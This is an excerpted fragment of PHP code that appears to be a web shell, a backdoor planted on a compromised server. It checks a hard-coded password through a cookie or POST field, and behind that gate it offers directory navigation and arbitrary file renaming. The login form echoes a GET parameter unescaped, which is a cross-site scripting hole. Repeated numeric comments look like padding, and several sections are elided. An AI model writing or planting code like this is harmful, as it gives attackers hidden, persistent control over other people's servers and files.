...
$auth_key = "f302d81a6d85440c777bbdd602563ff7";
...
$pass = false;
if (isset($_COOKIE['pw_name_70545'])) {
    if(($_COOKIE['pw_name_70545']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_70545'])) {
        if(($_POST['pw_name_70545']) == $auth_key) {
            setcookie("pw_name_70545", $_POST['pw_name_70545']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_70545' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682773370497 1724682773829880 1724682773564985 1724682773363635
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682773370497 1724682773829880 1724682773564985 1724682773363635
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682773370497 1724682773829880 1724682773564985 1724682773363635
            $name = PATH . "/" . $_GET['r'];
